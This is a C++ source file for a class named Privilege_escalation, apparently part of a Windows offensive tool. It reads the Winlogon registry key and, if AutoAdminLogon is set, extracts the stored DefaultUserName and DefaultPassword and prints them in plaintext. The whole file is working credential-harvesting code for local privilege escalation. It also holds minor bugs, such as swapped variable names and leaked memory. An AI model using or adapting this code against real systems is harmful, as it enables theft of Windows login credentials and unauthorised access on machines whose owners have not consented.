#include "Privilege_escalation.h"
#include <iostream>

Privilege_escalation::Privilege_escalation() {
	HKEY hKey = Privilege_escalation::existsAutoAdminLogon();

	if (hKey != NULL) {
		Privilege_escalation::getCredentialsByAutoAdminLogon(hKey);
		std::wcout << "Username\t:" << this->current_username << std::endl;
		std::wcout << "Password\t:" << this->current_password << std::endl;
	}
	else {
		RegCloseKey(hKey);
	}
}

BOOL Privilege_escalation::getCredentialsByAutoAdminLogon(HKEY hKey) {
	BOOL password = extractCredValue(hKey, L"DefaultUserName", this->current_username);
	BOOL username = extractCredValue(hKey, L"DefaultPassword", this->current_password);

	if (password && username) {
		return true;
	}
	return false;
}

BOOL Privilege_escalation::extractCredValue(HKEY hkey, LPCWSTR registryKeyValue, std::wstring &credential) {
	DWORD	dataSize = sizeof(DWORD);
	LONG	result = RegQueryValueEx(hkey, registryKeyValue, nullptr, nullptr, nullptr, &dataSize);

	if (result != ERROR_SUCCESS) {
		return FALSE;
	}
	else {
		LPBYTE data = new BYTE[dataSize];

		result = RegQueryValueEx(hkey, registryKeyValue, nullptr, nullptr, data, &dataSize);

		if (result != ERROR_SUCCESS) {
			return FALSE;
		}
		else {
			std::wstring value(reinterpret_cast<wchar_t*>(data));

			credential = value.c_str();

			delete[] data;

			return TRUE;
		}
	}
}

HKEY Privilege_escalation::existsAutoAdminLogon() {
	HKEY	hKey;
	LPCWSTR keyPath				= L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\";
	LPCWSTR valueName			= L"AutoAdminLogon";
	LONG	result				= RegOpenKeyEx(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_READ, &hKey);
	DWORD	autoAdminLogonValue = 0;

	if (result != ERROR_SUCCESS) {
		return NULL;
	}
	else {
		DWORD dataSize = 0;

		result = RegQueryValueEx(hKey, valueName, nullptr, nullptr, nullptr, &dataSize);

		if (result != ERROR_SUCCESS) {
			return NULL;
		}
		else {
			LPBYTE data = new BYTE[dataSize];

			result = RegQueryValueEx(hKey, valueName, nullptr, nullptr, data, &dataSize);

			if (result != ERROR_SUCCESS) {
				return NULL;
			}
			else {
				return hKey;
			}
		}
	}
}